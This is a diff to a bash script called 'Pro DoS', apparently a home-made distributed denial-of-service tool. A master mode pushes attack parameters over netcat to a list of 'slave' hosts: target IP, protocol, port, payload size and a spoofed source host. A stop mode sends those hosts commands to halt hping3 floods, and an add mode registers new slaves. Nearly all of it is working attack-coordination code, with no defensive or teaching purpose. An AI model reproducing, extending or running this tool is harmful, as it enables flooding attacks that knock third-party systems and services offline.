@@ -37,12 +37,14 @@ Last_Spoof_Host: example.com" > ~/.dos_history/.last_dos
         exit 0
     fi
 fi
-DOS_HISTORY_FILE=~/.dos_history/.last_dos
-LAST_IP=`grep -w 'Last_IP:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-LAST_PROTOCOL=`grep -w 'Last_Protocol:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-LAST_PORT=`grep -w 'Last_Port:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-LAST_PAYLOAD_SIZE=`grep -w 'Last_Payload_Size:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-LAST_SPOOF_HOST=`grep -w 'Last_Spoof_Host:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
+function dos_history {
+LAST_IP=`grep -w 'Last_IP:' $1 | awk '{printf $2}'`
+LAST_PROTOCOL=`grep -w 'Last_Protocol:' $1 | awk '{printf $2}'`
+LAST_PORT=`grep -w 'Last_Port:' $1 | awk '{printf $2}'`
+LAST_PAYLOAD_SIZE=`grep -w 'Last_Payload_Size:' $1 | awk '{printf $2}'`
+LAST_SPOOF_HOST=`grep -w 'Last_Spoof_Host:' $1 | awk '{printf $2}'`
+}
+dos_history ~/.dos_history/.last_dos
 UDP=off
 TCP=off
 SYN=off
@@ -67,7 +69,7 @@ elif [ ${SYN} = on ]; then
 elif [ ${ICMP} = on ]; then
     PROTOCOL=ICMP
 fi
-BACKTITLE="Pro DoS v0.1337rc1"
+BACKTITLE="Pro DoS v0.1337rc2"
 function func_history {
 echo "Protocol: ${PROTOCOL}"
 echo "IP: ${LAST_IP}"
@@ -92,35 +94,40 @@ exit 0
 function master {
     while read p; do
     SLAVE_IP=`echo ${p} | awk '{printf $1}'`
-    SLAVE_PORT=`echo ${p} | awk '{printf $2}'`
-    SLAVE_DAEMON_PORT=`echo ${p} | awk '{printf $3}'`
-    SLAVE_PASSPHRASE=`echo ${p} | awk '{printf $4}'`
+#    SLAVE_PORT=`echo ${p} | awk '{printf $2}'`
+    SLAVE_DAEMON_PORT=`echo ${p} | awk '{printf $2}'`
+    SLAVE_PASSPHRASE=`echo ${p} | awk '{printf $3}'`
     echo "Putting slave into listen state"
     echo "listen start ${SLAVE_PASSPHRASE}" | nc ${SLAVE_IP} ${SLAVE_DAEMON_PORT}
     sleep 0.5
-# For this bit, thank Stackoverflow
-# Very messy but it'll have to do :(
+    # For this bit, thank Stackoverflow
+    # Very messy but it'll have to do :(
     DOS_SESSION_FILE=`cat ${DOS_SESSION}`
-    echo -e "${DOS_SESSION_FILE}\nPassphrase: ${SLAVE_PASSPHRASE}" | nc ${SLAVE_IP} ${SLAVE_PORT}
-    echo "Sent attack details to ${SLAVE_IP} on port ${SLAVE_PORT}"
+    cat ${DOS_SESSION} | nc ${SLAVE_IP} ${SLAVE_DAEMON_PORT}
+    #echo -e "${DOS_SESSION_FILE}\nPassphrase: ${SLAVE_PASSPHRASE}" | nc ${SLAVE_IP} ${SLAVE_PORT}
+    echo "Sent attack details to ${SLAVE_IP} on port ${SLAVE_DAEMON_PORT}"
     done < .ip_list
     }
 #No GUI, derive parameters from the history.
 if [ "$1" = "Unattended" ] || [ "$1" = "unattended" ]; then
     func_history
 elif [ "$1" = "History" ] || [ "$1" = "history" ]; then
-    LAST_DIR=`pwd`
-    cd ~/.dos_history/
-    select DOS_SESSION in *; do
-#    DOS_SESSION=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --fselect ~/.dos_history/ 20 50 --stdout`
-    LAST_IP=`grep -w 'Last_IP:' ${DOS_SESSION} | awk '{printf $2}'`
-    LAST_PROTOCOL=`grep -w 'Last_Protocol:' ${DOS_SESSION} | awk '{printf $2}'`
-    LAST_PORT=`grep -w 'Last_Port:' ${DOS_SESSION} | awk '{printf $2}'`
-    LAST_PAYLOAD_SIZE=`grep -w 'Last_Payload_Size:' ${DOS_SESSION} | awk '{printf $2}'`
-    LAST_SPOOF_HOST=`grep -w 'Last_Spoof_Host:' ${DOS_SESSION} | awk '{printf $2}'`
-    func_history
-    done
-    cd ${LAST_DIR}
+    if [ -e $2 ]; then
+        dos_history $2
+        func_history
+    elif [ ! -e $2 ]; then
+        echo "$2: file not found"
+        exit 1
+    elif [ ! $2 ]; then
+        LAST_DIR=`pwd`
+        cd ~/.dos_history/
+        select DOS_SESSION in *; do
+            #DOS_SESSION=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --fselect ~/.dos_history/ 20 50 --stdout`
+            dos_history ${DOS_SESSION}
+            func_history
+            cd ${LAST_DIR}
+        done
+    fi
 #7:58PM 13/01/2012
 elif [ "$1" = "master" ] || [ "$1" = "Master" ]; then
     echo "Add IPs to ~/.dos_history/.ip_list where the IP is first on the line and port is second."
@@ -129,6 +136,13 @@ elif [ "$1" = "master" ] || [ "$1" = "Master" ]; then
     select DOS_SESSION in *; do
     echo "Selected ${DOS_SESSION}"
     master
+    # seems this bit is glitched for some reason, just add a slave on localhost and keep a remote stop daemon running
+    # to attack from localhost
+    #dosOnLocalConfirm=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --yesno "Run DoS on local machine too?" 5 34; echo $?`
+    #if [ dosOnLocalConfirm = 0 ]; then
+    #    dos_history ${DOS_SESSION_FILE}
+    #    func_history
+    #fi
     exit 0
     done
 elif [ "$1" = "stop" ] || [  "$1" = "Stop" ]; then
@@ -136,42 +150,18 @@ elif [ "$1" = "stop" ] || [  "$1" = "Stop" ]; then
     cd ~/.dos_history
     while read p; do
     SLAVE_IP=`echo ${p} | awk '{printf $1}'`
-    SLAVE_PORT=`echo ${p} | awk '{printf $3}'`
-    SLAVE_PASSPHRASE=`echo ${p} | awk '{printf $4}'`
+    SLAVE_PORT=`echo ${p} | awk '{printf $2}'`
+    SLAVE_PASSPHRASE=`echo ${p} | awk '{printf $3}'`
     echo "stop hping3 ${SLAVE_PASSPHRASE}" | nc ${SLAVE_IP} ${SLAVE_PORT}
     echo "Sent stop packet to ${SLAVE_IP} on port ${SLAVE_PORT}"
     done < .ip_list
     exit 0
-elif [ "$1" = "slave" ] || [ "$1" = "Slave" ]; then
-    if [ "$2" != "" ]; then
-        PORT_NUM=$2
-    else
-        PORT_NUM=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "What port to listen on?" 8 40 111 --stdout`
-    fi
-    NETCAT=`nc -l ${PORT_NUM} > netcat.temp`
-    DOS_HISTORY_FILE=netcat.temp
-    # Change this
-    SLAVE_PASS=default
-    PASSPHRASE=`grep -w 'Passphrase:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-    if [ "${PASSPHRASE}" == "${SLAVE_PASS}" ]; then
-        LAST_IP=`grep -w 'Last_IP:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-        LAST_PROTOCOL=`grep -w 'Last_Protocol:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-        LAST_PORT=`grep -w 'Last_Port:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-        LAST_PAYLOAD_SIZE=`grep -w 'Last_Payload_Size:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-        LAST_SPOOF_HOST=`grep -w 'Last_Spoof_Host:' ${DOS_HISTORY_FILE} | awk '{printf $2}'`
-        func_history
-    else
-        echo "Got invalid passphrase."
-    fi
-    rm netcat.temp
-    exit 0
 elif [ "$1" = "add" ] || [ "$1" = "Add" ]; then
-    SLAVE_IP=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Slave IP" 8 40 --stdout`
-    SLAVE_LISTEN_PORT=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Listen Port" 8 40 111 --stdout`
-    SLAVE_DAEMON_PORT=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Control Daemon Port" 8 40 112 --stdout`
-    SLAVE_PASSPHRASE=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Slave Passphrase" 8 40 default --stdout`
-    echo "Adding ${SLAVE_IP} with the port ${SLAVE_LISTEN_PORT} and daemon port ${SLAVE_DAEMON_PORT} to ~/.dos_history/.ip_list"
-    echo "${SLAVE_IP} ${SLAVE_LISTEN_PORT} ${SLAVE_DAEMON_PORT}" "${SLAVE_PASSPHRASE}" >> ~/.dos_history/.ip_list
+    SLAVE_INFO[1]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Slave IP" 8 40 --stdout`
+    SLAVE_INFO[2]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Control Daemon Port" 8 40 112 --stdout`
+    SLAVE_INFO[3]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Slave Passphrase" 8 40 default --stdout`
+    echo "Adding ${SLAVE_INFO[1]} with the port and daemon port ${SLAVE_INFO[2]} to ~/.dos_history/.ip_list"
+    echo "${SLAVE_INFO[1]} ${SLAVE_INFO[2]}" "${SLAVE_INFO[3]}" >> ~/.dos_history/.ip_list
     exit 0
 fi
 
